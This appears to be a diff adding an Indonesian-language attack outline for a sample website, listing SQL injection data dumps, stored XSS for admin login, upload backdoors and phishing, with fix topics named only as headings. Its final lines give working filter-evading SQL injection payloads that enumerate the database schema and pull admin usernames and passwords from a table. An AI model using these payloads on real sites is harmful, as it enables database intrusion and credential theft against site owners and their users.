@@ -1,0 +1,16 @@
+Website Contoh https://sharingilmu.my.id/
+
+SQL INJECTION -> DUMP DATA
+XSS STORED --> LOGIN ADMIN
+UPLOAD BACKDOORING -->
+PHISING
+
+MEMPERBAIKI SQL INJECTION
+MEMPERBAIKI XSS STORED
+MEMPERBAIKI UPLOAD BROKEN
+
+---HAL-HAL YANG DI PERLUKAN---
+command SQL INJECTION via Chrome
+'/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/1,2,3,4,5,6,7,8,9-- -
+(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)
+index.php/page?index=3%27/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/1,2,3,group_concat(username,0x3a,password),5,6,7,8+from+tbl_admin-- -
